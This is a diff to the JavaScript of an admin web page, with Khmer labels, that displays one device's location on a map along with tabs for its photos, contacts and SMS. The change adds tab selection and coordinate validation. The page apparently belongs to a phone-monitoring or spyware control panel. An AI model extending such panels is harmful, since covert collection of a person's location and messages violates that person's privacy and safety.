@@ -447,13 +447,13 @@
   </div>
 
   <div class="tabs">
-    <button class="tab-btn active" data-tab="location">📍 ទីតាំង</button>
+    <button class="tab-btn" data-tab="location">📍 ទីតាំង</button>
     <button class="tab-btn" data-tab="photos">🖼️ Photos</button>
     <button class="tab-btn" data-tab="contacts">👥 Contacts</button>
     <button class="tab-btn" data-tab="sms">💬 SMS</button>
   </div>
 
-  <div id="location-tab" class="tab-content active">
+  <div id="location-tab" class="tab-content">
     <div class="map-wrapper">
       <div id="map"></div>
       <button id="mapToggle" class="map-toggle" onclick="toggleMapView()">
@@ -496,6 +496,7 @@ const API = '/admin/api';
 const params = new URLSearchParams(window.location.search);
 let token = params.get('token');
 let userId = params.get('user_id');
+let targetTab = params.get('tab') || 'location'; // Default to location tab
 let commandData = {};
 let map = null;
 let standardLayer = null;
@@ -578,9 +579,22 @@ async function loadData() {
     renderContacts();
     renderSMS();
     
+    // Activate the target tab
+    activateTab(targetTab);
+    
   } catch (error) {
     console.error('Load error:', error);
     alert('❌ មិនអាចផ្ទុកទិន្នន័យ: ' + error.message);
+  }
+}
+
+function activateTab(tabName) {
+  const tabBtn = document.querySelector(`.tab-btn[data-tab="${tabName}"]`);
+  if (tabBtn) {
+    document.querySelectorAll('.tab-btn').forEach(b => b.classList.remove('active'));
+    document.querySelectorAll('.tab-content').forEach(c => c.classList.remove('active'));
+    tabBtn.classList.add('active');
+    document.getElementById(tabName + '-tab').classList.add('active');
   }
 }
 
@@ -617,50 +631,54 @@ function renderLocation() {
   }
   
   // Add marker with popup and animation
-  const pulseIcon = L.divIcon({
-    className: 'pulse-marker-wrapper',
-    html: '<div class="pulse-marker"></div>',
-    iconSize: [20, 20],
-    iconAnchor: [10, 10],
-  });
-  
-  const marker = L.marker([data.lat, data.lng], {
-    icon: pulseIcon,
-    animation: true,
-  }).addTo(map);
-  
-  const popupContent = `
-    <div style="font-family:'Noto Sans Khmer',sans-serif;min-width:200px">
-      <strong style="color:#667eea;font-size:14px">📍 ទីតាំងឧបករណ៍</strong><br>
-      <div style="margin-top:8px;font-size:12px;line-height:1.6">
-        ${data.village ? `<div>ភូមិ: <strong>${esc(data.village)}</strong></div>` : ''}
-        ${data.commune ? `<div>ឃុំ/សង្កាត់: <strong>${esc(data.commune)}</strong></div>` : ''}
-        ${data.district ? `<div>ស្រុក/ខណ្ឌ: <strong>${esc(data.district)}</strong></div>` : ''}
-        ${data.province ? `<div>ខេត្ត/ក្រុង: <strong>${esc(data.province)}</strong></div>` : ''}
-        ${data.country ? `<div>ប្រទេស: <strong>${esc(data.country)}</strong></div>` : ''}
-        <div style="margin-top:8px;color:#666;font-size:11px">
-          Lat: ${data.lat?.toFixed(6)} | Lng: ${data.lng?.toFixed(6)}<br>
-          Accuracy: ${data.accuracy || '—'}m
+  if (data.lat && data.lng && !isNaN(data.lat) && !isNaN(data.lng)) {
+    const pulseIcon = L.divIcon({
+      className: 'pulse-marker-wrapper',
+      html: '<div class="pulse-marker"></div>',
+      iconSize: [20, 20],
+      iconAnchor: [10, 10],
+    });
+    
+    const marker = L.marker([data.lat, data.lng], {
+      icon: pulseIcon,
+      animation: true,
+    }).addTo(map);
+    
+    const popupContent = `
+      <div style="font-family:'Noto Sans Khmer',sans-serif;min-width:200px">
+        <strong style="color:#667eea;font-size:14px">📍 ទីតាំងឧបករណ៍</strong><br>
+        <div style="margin-top:8px;font-size:12px;line-height:1.6">
+          ${data.village ? `<div>ភូមិ: <strong>${esc(data.village)}</strong></div>` : ''}
+          ${data.commune ? `<div>ឃុំ/សង្កាត់: <strong>${esc(data.commune)}</strong></div>` : ''}
+          ${data.district ? `<div>ស្រុក/ខណ្ឌ: <strong>${esc(data.district)}</strong></div>` : ''}
+          ${data.province ? `<div>ខេត្ត/ក្រុង: <strong>${esc(data.province)}</strong></div>` : ''}
+          ${data.country ? `<div>ប្រទេស: <strong>${esc(data.country)}</strong></div>` : ''}
+          <div style="margin-top:8px;color:#666;font-size:11px">
+            Lat: ${data.lat?.toFixed(6)} | Lng: ${data.lng?.toFixed(6)}<br>
+            Accuracy: ${data.accuracy || '—'}m
+          </div>
         </div>
       </div>
-    </div>
-  `;
-  
-  marker.bindPopup(popupContent).openPopup();
-  
-  // Smooth fly to location with animation
-  map.flyTo([data.lat, data.lng], 16, {
-    duration: 1.5,
-    easeLinearity: 0.5,
-  });
+    `;
+    
+    marker.bindPopup(popupContent).openPopup();
+    
+    // Smooth fly to location with animation
+    map.flyTo([data.lat, data.lng], 16, {
+      duration: 1.5,
+      easeLinearity: 0.5,
+    });
+  } else {
+    console.warn('Invalid location coordinates:', data.lat, data.lng);
+  }
   
   document.getElementById('locationStats').innerHTML = `
     <div class="stat-card">
-      <div class="stat-value">${data.lat?.toFixed(6) || '—'}</div>
+      <div class="stat-value">${data.lat && !isNaN(data.lat) ? data.lat.toFixed(6) : '—'}</div>
       <div class="stat-label">🌍 Latitude</div>
     </div>
     <div class="stat-card">
-      <div class="stat-value">${data.lng?.toFixed(6) || '—'}</div>
+      <div class="stat-value">${data.lng && !isNaN(data.lng) ? data.lng.toFixed(6) : '—'}</div>
       <div class="stat-label">🌍 Longitude</div>
     </div>
     <div class="stat-card">
